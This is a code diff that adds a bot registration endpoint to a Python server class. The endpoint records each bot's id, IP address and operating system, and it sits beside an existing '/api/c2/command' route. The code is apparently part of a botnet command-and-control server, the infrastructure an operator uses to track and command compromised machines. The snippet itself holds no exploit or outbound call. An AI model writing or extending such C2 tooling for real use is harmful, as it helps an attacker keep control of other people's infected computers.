@@ -1229,6 +1229,40 @@ class PrimaryNode:
                     content_type="application/json",
                 )
 
+            if method == "POST" and path.upper() == "/REGISTER":
+                try:
+                    registration_payload = json.loads(body.decode("utf-8"))
+                except (json.JSONDecodeError, UnicodeDecodeError):
+                    registration_payload = None
+
+                if not isinstance(registration_payload, dict):
+                    return self._http_response(
+                        400,
+                        "Bad Request",
+                        b'{"error":"invalid registration payload"}',
+                        content_type="application/json",
+                    )
+
+                bot_id = registration_payload.get("bot_id") or registration_payload.get("id")
+                bot_ip = registration_payload.get("bot_ip") or registration_payload.get("ip") or ""
+                bot_os = registration_payload.get("bot_os") or registration_payload.get("os") or ""
+
+                if not bot_id:
+                    return self._http_response(
+                        400,
+                        "Bad Request",
+                        b'{"error":"bot_id required"}',
+                        content_type="application/json",
+                    )
+
+                result = self._record_bot_registration(bot_id, bot_ip, bot_os)
+                return self._http_response(
+                    200,
+                    "OK",
+                    json.dumps(result).encode("utf-8"),
+                    content_type="application/json",
+                )
+
             if method == "POST" and path == "/api/c2/command":
                 try:
                     command_request = json.loads(body.decode("utf-8"))
